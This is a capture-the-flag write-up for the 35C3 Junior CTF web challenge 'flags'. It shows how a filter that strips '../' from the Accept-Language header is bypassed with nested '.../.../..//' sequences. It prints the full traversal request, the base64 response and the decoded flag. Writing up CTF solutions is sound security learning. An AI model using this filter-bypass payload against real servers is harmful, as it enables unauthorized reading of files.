# 35C3 Junior CTF
# Web write-up - flags

This is a write-up for one of the first web challenges in the 35C3 Junior CTF.

   
This was the tip:
> Fun with flags: http://35.207.169.47
Flag is at /flag

When we land on the page we get to see the PHP code running in the back-end:

![alt text](https://i.imgur.com/ryuhe28.png)


Looking at this PHP code we see that it's considering our browser language as a variable *lang* and using it to navigate to the respective path to get the country's flag.

Since the tip says that the challenge's flag is located in /flag we have to find a way to manipulate our request to trick hte page into thinking that our language is something else: a payload we are going to craft.

I opened BURP Suite with the repeater tool to craft this malicious request.

The first thought would be just replacing the language in the request with '*../flag*' but in we can see in the php code that they are protecting against this by replacing '*../*' with '', meaning they are deleting '*../*'.

So we just have to figure out a way to bypass this measure.

What I did was just repeating it and adding each of the characters in '*../*' after it.

'.../.../..//flag/' should, after deletion, output '../flag/'
Repeat it a bunch of times to go back on a lot of directories (we don't know how much until we get to ~/flag 

The final maliciously crafted request should look like this:

    GET / HTTP/1.1
    Host: 35.207.169.47
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: .../.../..//.../.../..//.../.../..//.../.../..//flag
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1

The raw return from this request is:

    <img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">

Decode the base64 and you get the flag:

> 35c3_this_flag_is_the_be5t_fl4g

